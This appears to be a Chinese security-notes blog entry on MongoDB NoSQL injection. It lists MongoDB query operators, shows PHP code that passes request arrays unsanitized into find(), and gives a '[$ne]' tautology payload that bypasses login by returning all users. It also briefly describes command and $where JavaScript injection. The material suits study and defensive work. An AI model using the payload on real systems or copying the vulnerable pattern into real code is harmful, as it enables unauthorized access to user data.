<h2 id="MongoDB"><a href="#MongoDB" class="headerlink" title="MongoDB"></a>MongoDB</h2><h3 id="基础语法-2"><a href="#基础语法-2" class="headerlink" title="基础语法"></a>基础语法</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mongodb条件操作符</span><br><span class="line">比较： </span><br><span class="line">    $gt : &gt;</span><br><span class="line">    $lt : &lt;</span><br><span class="line">    $gte: &gt;=</span><br><span class="line">    $lte: &lt;=</span><br><span class="line">    $ne : !=、&lt;&gt;</span><br><span class="line">    //查找用户名不为admin且password为123456的用户</span><br><span class="line">    db.user.find(&#123;&#x27;username&#x27;: &#123;$ne:&#x27;admin&#x27;&#125;, &#x27;password&#x27;: &#x27;123456&#x27;&#125;)</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">    * : 范围查询 &#123; &quot;age&quot; : &#123; &quot;$gte&quot; : 2 , &quot;$lte&quot; : 21&#125;&#125;</span><br><span class="line">    * : $ne &#123; &quot;age&quot; : &#123; &quot;$ne&quot; : 23&#125;&#125;</span><br><span class="line">    * : $lt &#123; &quot;age&quot; : &#123; &quot;$lt&quot; : 23&#125;&#125;</span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">条件：</span><br><span class="line">    $in : in</span><br><span class="line">    $nin: not in</span><br><span class="line">    $all: all </span><br><span class="line">    $or:or</span><br><span class="line">    $and: and</span><br><span class="line">    $not: 反匹配(1.3.3及以上版本)</span><br><span class="line">    $exist: </span><br><span class="line">    //如果记录中有包含该属性的全部返回</span><br><span class="line">    db.collection.find(&#123;title:&#123;$exists:true&#125;&#125;);  </span><br><span class="line">    //查找用户名为在这个数组中的用户信息</span><br><span class="line">    db.user.find(&#123;&#x27;username&#x27;: &#123;$in: [&#x27;admin&#x27;, &#x27;JrXnm&#x27;]&#125;&#125;)</span><br><span class="line"></span><br><span class="line">正则：  </span><br><span class="line">    模糊查询用正则式：db.customer.find(&#123;&#x27;name&#x27;: &#123;&#x27;$regex&#x27;:&#x27;.*s.*&#x27;&#125; &#125;)</span><br><span class="line">    正则的另一种写法：db.user.find(&#123;&#x27;username&#x27;:/jrx/i&#125;)</span><br></pre></td></tr></table></figure>

<h3 id="PHP-永真式注入"><a href="#PHP-永真式注入" class="headerlink" title="PHP 永真式注入"></a>PHP 永真式注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$data</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span> =&gt;  <span class="variable">$_REQUEST</span>[<span class="string">&#x27;username&#x27;</span>],</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span> =&gt;  <span class="variable">$_REQUEST</span>[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">); </span><br><span class="line"><span class="variable">$cursor</span> = <span class="variable">$collection</span>-&gt;find(<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure>

<p>传入<code>username[$ne]=1&amp;password[$ne]=1</code>构造查询用户名密码都不等于1的用户，即返回所有用户</p>
<h3 id="PHP-shell-注入"><a href="#PHP-shell-注入" class="headerlink" title="PHP shell 注入"></a>PHP shell 注入</h3><p><code>execute()/executeCommand()</code>方法执行拼接的 MongoDB 命令语句导致</p>
<p>闭合语句后利用 MongoDB 的语法进行盲注等操作</p>
<h3 id="JS-注入（-where-注入）"><a href="#JS-注入（-where-注入）" class="headerlink" title="JS 注入（$where 注入）"></a>JS 注入（$where 注入）</h3><p><code>$where</code>操作符表示执行其中的 JS 内容</p>
<p>可进行绕过、盲注、JS 命令执行等操作</p>
]]></content>
      <categories>
        <category>Web之路</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Sec</tag>
      </tags>
  </entry>
</search>
